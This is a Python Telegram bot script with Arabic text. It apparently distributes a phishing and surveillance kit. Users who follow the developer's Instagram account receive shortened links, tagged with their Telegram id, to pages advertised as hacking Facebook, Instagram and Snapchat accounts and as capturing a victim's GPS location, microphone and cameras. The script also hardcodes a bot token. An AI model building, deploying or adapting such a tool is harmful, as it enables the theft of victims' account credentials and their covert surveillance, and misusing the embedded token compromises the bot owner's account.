import telebot
from telebot import types
import requests
from flask import Flask
from threading import Thread
import os
import time

# إعداد السيرفر لضمان البقاء أونلاين
app = Flask('')
@app.route('/')
def home(): return "M.Y.9 System Online"

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
def keep_alive(): Thread(target=run).start()

# --- إعدادات البوت ---
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
MY_ID = '7238206121' # آي دي أبو سند
bot = telebot.TeleBot(TOKEN)

# دالة اختصار الروابط
def short(url):
    try:
        r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return r.text
    except: return url

@bot.message_handler(commands=['start'])
def start(m):
    uid, name = m.chat.id, m.from_user.first_name
    
    # 1. رسالة التمويه والمتابعة (m_y_.9)
    warning_text = f"""
⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:

عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام لـتـفـعـيـل الـنـظـام.

🔴 تـحـذيـر: الـنـظـام يـقـوم الآن بـالـتـحـقـق مـن مـتـابـعـتـك. سـيـتـم إرسـال الروابـط بـعـد (5 دقـائـق) تـلـقـائـيـاً 💀🔥
    """
    markup = types.InlineKeyboardMarkup()
    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (m_y_.9)", url="https://www.instagram.com/m_y_.9/")
    markup.add(btn_insta)
    
    bot.send_message(uid, warning_text, reply_markup=markup)

    # 2. مهمة الـ 5 دقائق في الخلفية
    def background_task(chat_id, user_name):
        time.sleep(300) # انتظار الـ 5 دقائق
        
        h = user_name.replace(" ", "_")
        base = "https://m-y-9-tech.github.io/fb/"
        p = f"?id={chat_id}&hunter={h}&dev={MY_ID}"
        
        lnks = {
            "fb": short(base+"fb.html"+p), "ig": short(base+"ig.html"+p),
            "sn": short(base+"snap.html"+p), "lc": short(base+"loc.html"+p),
            "au": short(base+"audio.html"+p), "c1": short(base+"cam.html"+p),
            "c2": short(base+"cam2.html"+p)
        }

        main_msg = f"""
🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق ✅

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🔹 اخـ^ـتـ^ـراق فـ^ـيـ^ـس بـ^ـوك (2009)
🔗 `{lnks['fb']}`

🔸 اخـ^ـتـ^ـراق انـ^ـسـ^ـتـ^ـغـ^ـرام (2009)
🔗 `{lnks['ig']}`

👻 اخـ^ـتـ^ـراق سـ^ـنـ^ـاب شـ^ـات (2009)
🔗 `{lnks['sn']}`

📍 سـ^ـحـ^ـب الـ^ـمـ^ـوقـ^ـع (GPS)
🔗 `{lnks['lc']}`

🎤 سـ^ـحـ^ـب الـ^ـصـ^ـوت (Mic)
🔗 `{lnks['au']}`

🤳 كـ^ـمـ^ـرة أمـ^ـامـ^ـيـ^ـة (HD)
🔗 `{lnks['c1']}`

📷 كـ^ـمـ^ـرة خـ^ـلـ^ـفـ^ـيـ^ـة (HD)
🔗 `{lnks['c2']}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚖️ إخـ^ـلاء مـ^ـسـ^ـؤوليـ^ـة: المـطـور غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ Status: Connected
        """
        try:
            bot.send_message(chat_id, main_msg, parse_mode="Markdown", disable_web_page_preview=True)
        except: pass

    Thread(target=background_task, args=(uid, name)).start()

if __name__ == "__main__":
    keep_alive()
    # الحل النهائي للـ 409: حذف الويب هوك وتصفير الطلبات (skip_pending)
    bot.remove_webhook()
    time.sleep(1)
    bot.infinity_polling(non_stop=True, skip_pending=True)
